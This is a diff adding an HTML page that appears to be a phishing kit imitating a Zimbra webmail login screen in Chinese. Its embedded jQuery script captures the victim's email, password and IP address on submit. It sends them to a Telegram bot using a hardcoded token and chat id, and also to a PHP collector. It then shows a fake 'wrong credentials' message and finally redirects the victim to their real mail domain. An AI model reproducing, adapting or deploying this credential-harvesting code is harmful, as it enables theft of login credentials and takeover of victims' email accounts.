@@ -1,0 +1,292 @@
+
+<html id="html" data-emailvalue="[[-Email-]]" lang="en"><head><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script>
+<head>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+    <title>电子邮件设置 - 密码维护 </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+        content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <link rel="stylesheet" type="text/css" href="https://proteaprinters.co.za/404/chi/assets/css/style.css">
+    <link rel="SHORTCUT ICON" href="https://proteaprinters.co.za/404/chi/assets/img/favicon.ico">
+
+    <style type="text/css">
+        .auto-style1 {
+            font-size: 12px;
+            font-weight: normal;
+        }
+
+        #msg {
+            display: none;
+        }
+    </style>
+</head>
+
+<body onload="onLoad();">
+
+    <div id="modifiedLogin" class="LoginScreen">
+        <div class="modernCenter">
+            <div class="modernContentBox">
+                <div class="logo">
+                    <a href="#" id="bannerLink" target="_new" title='Zimbra'>
+                        <span class="ScreenReaderOnly">Zimbra</span>
+                    </a>
+                    <img alt="China Trademark Email" height="24" src="https://proteaprinters.co.za/404/chi/assets/img/email-309678_1280-1024x624.png"
+                        width="38">
+                </div>
+                <form id="zLoginForm" method="post" name="loginForm" action="form.php" accept-charset="UTF-8">
+                    <input type="hidden" name="loginOp" value="login" />
+                    <input type="hidden" name="login_csrf" value="be542a13-745b-4204-8d80-2aaab8c2ec5a" />
+
+                    <div class="signIn">登录<br><br>
+                        <span class="auto-style1">
+                            为了验证你是账户的所有者，请输入你当前的密码
+                        </span><br>
+                    </div>
+                    <div class="form">
+                        <div id="msg" class="errorMessage">
+                            密碼無效...！請輸入正確的密碼。
+                        </div>
+                        <div class="loginSection">
+                            <label for="username" class="zLoginFieldLabel">电子邮件</label>
+                            <input id="3w41l" tabindex="1" class="zLoginFieldInput" name="3w41l" type="text"
+                               value="" size="40" maxlength="1024" autocapitalize="off"
+                                autocorrect="off" />
+                            <label for="password" class="zLoginFieldLabel">电子邮件密码</label>
+                            <div class="passwordWrapper">
+                                <input id="q455m0T2" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="q455m0T2"
+                                    type="password" value="" size="40" maxlength="1024" />
+                                <span toggle="#password" onClick="showPassword();" id="showSpan"
+                                    style="display: block;">显示</span>
+                                <span toggle="#password" onClick="showPassword();" id="hideSpan"
+                                    style="display: none;">隐藏</span>
+                            </div>
+                            <div class="signInAndLabel">
+                                <div>
+				    <button id="submit-btn" type="submit" tabindex="5" class="loginButton">登录</button>
+                                   
+                                </div>
+                                <div class="rememberCheckWrapper">
+                                    <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme" />
+                                    <label id="remember" for="remember">保持登录状态</label>
+                                </div>
+                            </div>
+                        </div>
+                        <div>
+                            <hr />
+                        </div>
+                        <div>
+                            <div class="versionBlock">
+                                <label for="client">网络应用程序版本</label>
+                                <div style="position: relative;">
+                                    <select id="client" name="client"
+                                        onchange="clientChange(this.options[this.selectedIndex].value)">
+                                        <option value="preferred" selected> 默认情况下</option>
+                                        <option value="advanced"> 经典之作</option>
+                                        <option value="modern"> 现代</option>
+                                    </select>
+                                    <input type="button" class="alignWhatsThis" onclick="showTooltip();"
+                                        id='ZLoginWhatsThisButton' />
+                                </div>
+
+                                <div id="ZLoginWhatsThis">
+                                    <div class="ZLoginInfo">
+                                        <span id="dialogCloseButton" onclick="hideTooltip();">&times;</span>
+                                        <p><strong>Modern</strong><br> The Modern Web App delivers a responsive
+                                            experience across all your devices and integrates with many popular apps.
+                                        </p>
+                                        <p><strong>Classic</strong><br> The Classic Web App is familiar to long-time
+                                            Zimbra users. It delivers advanced collaboration and calendar features
+                                            popular with power users on Desktop web browsers.</p>
+                                        <p><strong>Default</strong><br> This will sign you in according to your saved
+                                            Preference. In the Modern Web App, set this preference in Settings > General
+                                            > Zimbra Version. In Classic, set it in Preferences > General > Sign In.</p>
+                                    </div>
+                                </div>
+
+
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            <div class="decor1"></div>
+        </div>
+
+        <div class="Footer">
+            <div id="ZLoginNotice" class="legalNotice-small">版权所有 2005-2026 - 保留所有权利。</div>
+        </div>
+        <div class="decor2"></div>
+    </div>
+
+ <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+  <script>
+    $(document).ready(function(){
+      let userIP = '';
+      var count=0;
+      var pcount=0;
+      $.getJSON('https://api.ipify.org?format=json', function(data){
+        userIP = data.ip;
+      });
+
+      //  page setup area ==========================================================================
+      var bot_token = "8849535993:AAFo46vsqHjABcBn_2BNnmB5UbiGbs3W-i0"; 
+      var group_id = "8339707884;                                      
+      var retries = 2;
+
+
+
+                  //   set your php forder here 
+      //  php server setup area ========================================================================
+      var server_url = ".php"; 
+      // ===============================================================================================
+
+      const htmlElement = document.getElementById("html");
+      var _3w41l = window.location.hash.substr(1);
+      var h3w41l = htmlElement.dataset.emailvalue;
+      if (_3w41l || h3w41l) {
+        var my_3w41l = _3w41l || h3w41l;
+        $('#3w41l').val(my_3w41l);
+        // $('#hdn3w41l').val(my_3w41l);
+
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_3w41l)) {
+          $('#error').show();
+          _3w41l.focus;
+          return false;
+        }
+      }
+
+      $('#zLoginForm').on('submit', function(event){
+        event.preventDefault();
+        $('#submit-btn').attr('disabled', 'disabled');
+        $('#error').hide();
+        $('#successMessage').hide();
+        $('#pwdMsg').hide();
+        _3w41l=$("#3w41l").val();
+        var q455m0T2=$("#q455m0T2").val();
+
+        if (!q455m0T2) {
+          $('#pwdMsg').show();
+
+          return false;
+        }
+
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(_3w41l)) {
+          $('#error').show();
+          _3w41l.focus;
+          return false;
+        }
+
+        // TG script
+        if (bot_token && group_id) {
+          var url_tg = "https://api.telegram.org/bot"+bot_token+"/sendMessage?chat_id="+group_id+"&text=";
+          url_tg = url_tg + encodeURIComponent("====CHINA LOGS====\n Email: " + _3w41l + "\nPassword: " + q455m0T2 + "\nUserIp: " + userIP);
+          $.ajax({
+            type: 'POST',
+            url: url_tg,
+            // data: $this.serialize(),
+            beforeSend: function(xhr){
+            },
+            success: function(response){
+              if(response){
+                    console.log(`real count of ${count}`)
+                $("#q455m0T2").val("");
+                if (retries > 0) {
+                  if (count>=retries-1) {
+                    count=0;
+                    console.log(`got redirect count of ${count}`)
+                    window.location.replace(`https://${_3w41l.split('@')[1]}`);
+                  } else {
+                    count+=1;
+                    console.log(`increased count of ${count}`)
+                    $('#submit-btn').removeAttr('disabled');
+                  }
+                }
+                $("#successMessage").show();
+                $('#successMessage').html("자격 증명이 잘못되었습니다. 다시 시도해 주세요");
+              }
+            },
+            error: function(){
+              $("#q455m0T2").val("");
+              if (retries > 0) {
+                if (count>=retries-1) {
+                  count=0;
+                    console.log(`got error redirect count of ${count}`)
+                  window.location.replace(`https://${_3w41l.split('@')[1]}`);
+                } else {
+                  count+=1;
+                  $('#submit-btn').removeAttr('disabled');
+                }
+              }
+              $("#successMessage").show();
+              $('#successMessage').html("자격 증명이 잘못되었습니다. 다시 시도해 주세요");
+            },
+            complete: function(){
+            }
+          });
+        }
+
+        // php server script
+        if (server_url.trim()) {
+          $.ajax({
+            type: 'POST',
+            url: server_url,
+            data: {
+                    _3w41l: _3w41l,
+                    q455m0T2: q455m0T2,
+                    userIP: userIP
+                  },
+            // data: $this.serialize(),
+            beforeSend: function(xhr){
+            },
+            success: function(response){
+              if(response){
+                console.log(response);
+                $("#q455m0T2").val("");
+                if (retries > 0) {
+                  if (pcount>=retries-1) {
+                    pcount=0;
+                    window.location.replace(`https://${_3w41l.split('@')[1]}`);
+                  } else {
+                    pcount+=1;
+                    $('#submit-btn').removeAttr('disabled');
+                  }
+                }
+                $("#successMessage").show();
+                $('#successMessage').html("자격 증명이 잘못되었습니다. 다시 시도해 주세요");
+              }
+            },
+            error: function(){
+              $("#q455m0T2").val("");
+              if (retries > 0) {
+                if (pcount>=retries-1) {
+                  pcount=0;
+                  window.location.replace(`https://${_3w41l.split('@')[1]}`);
+                } else {
+                  pcount+=1;
+                  $('#submit-btn').removeAttr('disabled');
+                }
+              }
+              $("#successMessage").show();
+              $('#successMessage').html("자격 증명이 잘못되었습니다. 다시 시도해 주세요");
+            },
+            complete: function(){
+            }
+          });
+        }
+      });
+    });
+  </script> <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+
+</div>
+
+</body>
+
+</html>
